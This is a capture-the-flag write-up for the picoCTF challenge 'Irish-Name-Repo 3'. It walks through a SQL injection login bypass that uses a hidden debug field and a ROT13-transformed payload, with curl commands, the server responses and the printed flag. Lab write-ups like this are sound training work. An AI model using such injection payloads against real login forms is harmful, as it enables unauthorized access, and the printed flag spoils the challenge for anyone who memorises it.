# **_Irish-Name-Repo 3_**
## Description
>There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/` or `http://jupiter.challenges.picoctf.org:54253`. Try to see if you can login as admin!

## Solution
The login form is only asking for a password, therefore I assume the statement should look like 
> 

So I entered `'or 1=1--` for password, however `'` seems to be filtered
I tried to bypass the filter by adding `%00` infront of `'`, but still didn't work
Then I URL encoded `'` to `%27`, it passed the filter, but replied `Login Failed`
Looked at the html code and notice that there is a hidden field `debug` sent with the form
```HTML
<form action="login.php" method="POST">
    <fieldset>
        <div class="form-group">
            <label for="password">Password:</label>
                <div class="controls">
                    <input type="password" id="password" name="password" class="form-control">
                </div>
        </div>
            <input type="hidden" name="debug" value="0">
        <div class="form-actions">
            <input type="submit" value="Login" class="btn btn-primary">
        </div>
    </fieldset>
</form>
```
Change `debug` value to `1` and send the request
```console
❯ curl "https://jupiter.challenges.picoctf.org/problem/54253/login.php" --data "password=%27or 1=1--&debug=1"
<pre>password: 'or 1=1--
SQL query: SELECT * FROM admin where password = ''be 1=1--'
</pre>% 
```
The respond shows the `SQL` query used, notice `or` becomes `be`,it seems like only the text are being encrypted with `ROT13`
Change `or` to `be` and sent the request again to get the flag
```console
❯ curl -s "https://jupiter.challenges.picoctf.org/problem/54253/login.php" --data "password=%27be 1=1--" | html2text
****** Logged in! ******
Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}
```